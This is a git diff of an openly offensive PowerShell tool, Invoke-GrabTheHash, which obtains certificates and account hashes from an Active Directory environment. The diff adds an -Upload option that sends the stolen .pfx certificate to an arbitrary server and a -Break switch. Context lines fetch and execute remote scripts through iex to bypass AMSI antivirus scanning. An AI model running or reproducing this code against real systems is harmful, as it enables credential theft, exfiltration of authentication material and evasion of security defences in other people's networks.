@@ -25,8 +25,14 @@ Specify the Account Client Name
 .PARAMETER PFX
 Provide a previously obtained .pfx to get the account hash
 
+.PARAMETER Upload
+Upload .pfx file to a server
+
 .PARAMETER Machine
 Work with Machine Accounts TGTs and Certificates (needs to run in elevated context)
+
+.PARAMETER Break
+Stop before grabbing the Hash
 #>
 
 function Invoke-GrabTheHash
@@ -44,10 +50,14 @@ function Invoke-GrabTheHash
 		[string]$Domain,
 		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
 		[string]$PFX,
+  		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
+		[string]$Upload,
 		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
 		[switch]$CertTemplates,
 		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
-		[switch]$Machine
+		[switch]$Machine,
+  		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
+		[switch]$Break
 	)
 	
 	$ErrorActionPreference = "SilentlyContinue"
@@ -311,6 +321,22 @@ CertificateTemplate = "$TemplateName"
 	$certstore.close()
 	
 	Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"
+
+ 	if($Upload){
+		Write-Host "[+] Uploading $CN.pfx to $Upload"
+		Write-Host ""
+		$file = "$pwd\$CN.pfx";
+		$httpuri = "$Upload";
+		$webclient = New-Object System.Net.WebClient;
+		$uri = New-Object System.Uri($httpuri);
+		$webclient.UploadFile($uri, $file) | Out-Null
+	}
+	
+	if($Break){
+		Write-Host "[-] Stopping here, before grabbing the Hash"
+		Write-Host ""
+		break
+	}
 		
 	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
 	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
